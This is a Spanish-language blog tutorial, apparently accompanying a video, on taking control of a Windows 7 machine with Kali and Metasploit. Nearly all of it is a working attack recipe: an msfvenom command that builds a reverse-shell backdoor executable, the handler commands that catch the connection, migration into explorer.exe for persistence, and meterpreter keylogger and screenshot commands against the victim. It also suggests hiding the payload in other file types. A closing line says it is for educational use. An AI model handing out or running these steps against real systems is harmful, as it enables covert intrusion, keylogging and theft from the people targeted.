---
title: "Acceso a sistema Windows 7 a traves de Kali y Metasploit"
date: "2020-07-16"
---

https://www.youtube.com/watch?v=2WLZKu-c1\_Q

Acceso a un sistema Windows 7 a traves de un backdoor en formato exe.

Explicación de los comandos

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > /var/www/html/victim/programa.exe
```

msfvenom : Es una herramienta para crear backdoors

\-p windows/meterpreter/reverse\_tcp : Especifica el payload a usar en este caso reverse\_tcp

LHOST: Indica el host de escucha

LPORT: Indica el puerto de escucha

\-f exe: Indica el formato de salida del backdoor

\>/var/www/html/victim/programa.exe: Especifica la ruta de salida del backdoor

* * *

```
use exploit/multi/handler
```

Ejecuta el script handler, el cual utilizaremos para conectarnos

* * *

```
set payload windows/meterpreter/reverse_tcp
```

Configura el payload que va a usar para conectar al que hemos especificado al crear el backdoor

* * *

```
show options
```

Muestra las opciones que tiene handler para conectarse

* * *

```
set LHOST 192.168.0.107
```

```
 set LPORT 4444
```

Establece el HOST y el PUERTO a los de la maquina que esta a la escucha, en mi caso la maquina atacante con Kali

* * *

```
run
exploit
```

Cualquiera de los dos iniciará handler

* * *

```
sudo apachectl start
```

Inicia el servidor por el cual transfiero los archivos a la maquina con windows 7. En mi caso lo paso como un exe pero este tambien podria ser inyectado en cualquier tipo de archivo que se pueda ejecutar (pdf, jpg, mp4, otro exe,...)

* * *

Cuando el usuario ejecuta el script, este se conecta a la maquina atacante (Kali) y ya esta puede ejecutar comandos

* * *

Comandos que utilizo después de conectar:

```
ps
```

Muestra el arbol de procesos incluyendo el PID que seguidamente utilizamos.

* * *

```
migrate 2120
```

Migra el proceso del backdoor al de explorer.exe, asi se mantendra activo mientras explorer.exe este activo.

* * *

Una vez hecho esto ya tenemos control total sobre la maquina

Otros comandos usados en el video:

Screenshot: Hace una captura de la maquina victima

Sysinfo: Muestra información del ordenador victima

Keyscan: Es el keylogger que incluye meterpreter

- Keyscan\_start: Inicia el keylogger
- Keyscan\_dump: Vuelca lo que tiene registrado el keylogger desde el ultimo dump
- Keyscan\_stop: Detiene el keylogger

Las técnicas y herramientas de hacking mostradas en el articulo y/o en el vídeo son de mi propiedad y expuestas con fines educativos. No me hago responsable del mal uso de l@s mismos
